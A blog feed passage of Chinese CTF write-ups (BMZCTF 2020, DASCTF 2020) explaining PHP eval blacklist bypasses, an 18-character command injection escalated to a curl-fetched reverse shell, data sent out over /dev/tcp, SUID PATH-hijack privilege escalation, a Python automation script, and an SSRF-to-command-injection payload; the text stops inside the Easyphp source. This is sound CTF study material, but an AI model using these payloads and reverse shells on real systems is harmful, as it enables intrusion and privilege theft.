        <content type="html"><![CDATA[<h2 id="2020BMZCTF-Write-up"><a href="#2020BMZCTF-Write-up" class="headerlink" title="2020BMZCTF Write-up"></a>2020BMZCTF Write-up</h2><p>随缘做了两道web</p><p>昵称：Err0r</p><span id="more"></span><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB-ezeval"><a href="#WEB-ezeval" class="headerlink" title="WEB_ezeval"></a>WEB_ezeval</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'echo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'preg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'server'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'chr'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'decode'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ascii'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'replace'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'print'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'scan'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'decode'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ini_'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pcntl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'open'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'link'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'current'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'local'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'require'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"BMZCTF"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，但肯定还有能用的，<code>&lt;、&gt;、&quot;</code>因为<code>htmlspecialchars</code>也是不能用的</p><p>往无参数RCE方向走发现不太可行，最后利用<code>base_convert</code>构造语句</p><p>把<code>system</code>由base36转为base10，利用<code>base_convert(2146934604002,10,36)</code>发现可以执行系统命令，于是想读取根目录flag发现<code>/</code>传不进去，于是继续<code>base_convert(16191,10,36)</code>，利用<code>chr</code>函数转换<code>/</code>，最终读取flag</p><p>payload：<code>cmd=base_convert(2146934604002,10,36)(base_convert(16191,10,36)(47).flag);</code></p><img src="/article/bmzctf2020/image-20201228205633315.png" class="" title="image-20201228205633315" loading="lazy"><hr><h4 id="WEB-penetration"><a href="#WEB-penetration" class="headerlink" title="WEB_penetration"></a>WEB_penetration</h4><p>主要考察反弹shell，提权</p><p>打开得源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'e'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'g'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'j'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'+'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'k'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&lt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\>'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'o'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\~'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\@'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\*'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\('</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\)'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\!'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\='</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\.'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&#125;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\&#123;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blacklisted</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>命令执行，<code>ip</code>经过blacklist过滤后exec执行，但是测着发现foreach会每次取一位然后来执行，执行多次，也就是说只要不含<code>b</code>就可以执行，这里可以直接执行，但限制了18个字符的长度限制发挥，尝试反弹shell，明显反弹shell第一个单词<code>bash</code>会被过滤，另寻方法。</p><p>首先就执行<code>find / -name fl*&gt;1</code>，执行后输出结果到文件1，结果发现根本就没有flag！</p><p>测试echo可写，于是准备写个一句话木马，结果发现写的.php不执行，应该是写了规则。</p><p>于是准备写个<code>.htaccess</code>，结果一写直接500内部服务报错。</p><p>老实弹shell吧。</p><p>想直接写<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code>，结果发现<code>&amp;</code>写不进去，测试发现靶机可连外网，于是在自己服务器上写个名为1的文件，内容为<code>bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</code></p><p>再在靶机写个文件<code>1d</code>，内容为<code>curl ip/1&gt;1</code></p><p>运行<code>sh 1d</code>，发现不行，估计没有执行权限，赋予，<code>chmod 777 1d</code>，靶机运行了curl命令，访问我的服务器下载了文件1，这样就成功写了反弹shell的命令</p><p>在我的服务器监听端口，<code>nc -lvp [port]</code></p><p>再给1赋予执行权限<code>chmod 777 1</code>，需要用bash执行，可是不可以含有<code>b</code>，于是利用<code>?</code>和<code>[a-c]</code>，即执行<code>/?in/[a-c]ash 1</code></p><p>我的服务器成功getshell</p><img src="/article/bmzctf2020/image-20201228211635023.png" class="" title="image-20201228211635023" loading="lazy"><p>根目录下没有发现flag，也没有readflag，找也找不到flag，有个<code>start.sh</code>，读取一下看看</p><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@2a4c1fe2f663:/var/www/html$ <span class="token function">cat</span> /start.sh<span class="token function">cat</span> /start.sh<span class="token comment">#!/bin/bash </span><span class="token function">chmod</span> <span class="token number">755</span> index.phpgcc /root/demo.c <span class="token parameter variable">-o</span> love<span class="token function">mv</span> love /usr/bin/love<span class="token function">chmod</span> u+s /usr/bin/love<span class="token function">rm</span> /var/log/apache2/access.log<span class="token function">rm</span> /var/log/apache2/error.log</code></pre><p>关键在这个<code>/user/bin/love</code></p><p>读出来看看，服务器开监听端口，靶机shell执行<code>cat /usr/bin/love &gt; /dev/tcp/[ip]/[port]</code></p><img src="/article/bmzctf2020/image-20201228212753119.png" class="" title="image-20201228212753119" loading="lazy"><p>成功拿到文件，拷下来反编译一下(web狗汗颜)</p><img src="/article/bmzctf2020/image-20201228212718787.png" class="" title="image-20201228212718787" loading="lazy"><p>结果就是系统执行个ps命令</p><p>结合find发现了的一点东西</p><img src="/article/bmzctf2020/image-20201228211807363.png" class="" title="image-20201228211807363" loading="lazy"><p><code>/root</code>目录没有权限，也许可能考点就是提权了</p><p>这是一个具有SUID权限的程序，在tmp目录写个内容为<code>/bin/bash</code>的ps文件，添加进环境变量，这样执行程序调用ps命令会优先从这里执行，而这里是我们伪造的ps命令，然后相当于以高级权限执行了<code>/bin/bash</code>。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span> /tmp/ps<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>/usr/bin/love</code></pre><p>成功提权，直接<code>cat /root/flag</code></p><img src="/article/bmzctf2020/image-20201228213633573.png" class="" title="image-20201228213633573" loading="lazy"><p>理解了师傅之前说的，提权，才是开始。</p><p>是的，权限真香，这才刚刚开始</p><p>后面再研究吧</p><p>附上一键弹shell脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/26 20:36@Auth ： gyy@Blog：http://err0r.top"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://www.bmzclub.cn:21257/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?ip="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload1 <span class="token operator">=</span> <span class="token string">"curl [ip]/[filename]>1"</span>    i <span class="token operator">=</span> <span class="token number">0</span>    flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> flag<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string">"echo '"</span> <span class="token operator">+</span> payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\c'>1d"</span>            execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">5</span>            flag <span class="token operator">-=</span><span class="token number">1</span>        payload <span class="token operator">=</span> <span class="token string">"echo '"</span><span class="token operator">+</span>payload1<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\c'>>1d"</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        i <span class="token operator">+=</span><span class="token number">5</span>    check<span class="token punctuation">(</span>baseurl<span class="token operator">+</span><span class="token string">"1d"</span><span class="token punctuation">)</span>    <span class="token comment"># bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"sh 1d"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"chmod 777 1"</span><span class="token punctuation">)</span>    execit<span class="token punctuation">(</span><span class="token string">"/?in/[a-c]ash 1"</span><span class="token punctuation">)</span></code></pre><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很有收获，不枉这两题，尤其的第二题，非常有价值。</p><p>当然不能小看第一题，别看WP短短几行，背后是无数次的尝试与探索，第二题更是如此。</p><p>2020年最后一份WP，还有很长路要走，加油吧。</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020DASctf-Writeup</title>
      <link href="article/dasctf2020/"/>
      <url>article/dasctf2020/</url>
      
        <content type="html"><![CDATA[<h2 id="2020DASCTF-Write-up"><a href="#2020DASCTF-Write-up" class="headerlink" title="2020DASCTF Write-up"></a>2020DASCTF Write-up</h2><p>队伍名称：Test1024</p><p>队伍成员：</p><p>gyy，Trick，X06</p><p>队伍情况：</p><hr><img src="/article/dasctf2020/image-20201226160717993.png" class="" title loading="lazy"><img src="/article/dasctf2020/image-20201226160703650.png" class="" title="range" loading="lazy"><hr><p>继续学习吧，还是太菜了</p><span id="more"></span><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Easyjs"><a href="#Easyjs" class="headerlink" title="Easyjs"></a>Easyjs</h4><p>2020网鼎杯线下半决赛web_babyJS，近乎原题</p><p>打开即为空的json</p><img src="/article/dasctf2020/image-20201226161339893.png" class="" title="image-20201226161339893" loading="lazy"><p>给了源码，关键web逻辑<code>routes\index.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> url<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> child_process<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> request<span class="token operator">=</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> blacklist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'127.0.0.1.xip.io'</span><span class="token punctuation">,</span><span class="token string">'::ffff:127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token string">'[::1]'</span><span class="token punctuation">,</span><span class="token string">'::1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> u<span class="token operator">=</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\"\']</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> log<span class="token operator">=</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">echo  '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>href<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'>>/tmp/log</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>child_process<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">data</span><span class="token operator">:</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/tmp/log'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/debug'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> u <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>url<span class="token punctuation">;</span><span class="token keyword">var</span> urlObject<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>urlObject<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dest<span class="token operator">=</span>urlObject<span class="token punctuation">.</span>href<span class="token punctuation">;</span><span class="token function">request</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span>result<span class="token punctuation">,</span>body</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>有个debug路径，请求会判断是不是本地回环访问，即<code>127.0.0.1</code>等，不是则返回空json。如果是本地访问就会读取get中url参数，去除单双引号用nodejs的url.parse解析，解析后的url拼接到shell命令中执行，输出<code>/tmp/log</code>再返回内容。</p><p>由此，应先POST<code>/debug</code>， 在<code>url</code>参数中绕过blacklist，让程序再GET请求自己的<code>/debug</code>路径，之后构造注入命令。</p><p>考察一个SSRF，构造payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527@xx&quot;&#125;</code>最后闭合引号</p><p>然后考虑把flag文件复制到<code>/tmp/log</code>，利用<code>$IFS</code></p><p>最终payload：<code>&#123;&quot;url&quot;:&quot;http://127.0.0.2:10300/debug?url=http://%2527;%2527@xx;cp$IFS/tmp/flag$IFS/tmp/log%00&quot;&#125;</code></p><hr><h4 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h4><p>神奇的phar反序列化</p><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/uploads/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'template.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$template</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tp1'</span><span class="token operator">=></span><span class="token string single-quoted-string">'tp1.tpl'</span><span class="token punctuation">,</span><span class="token string 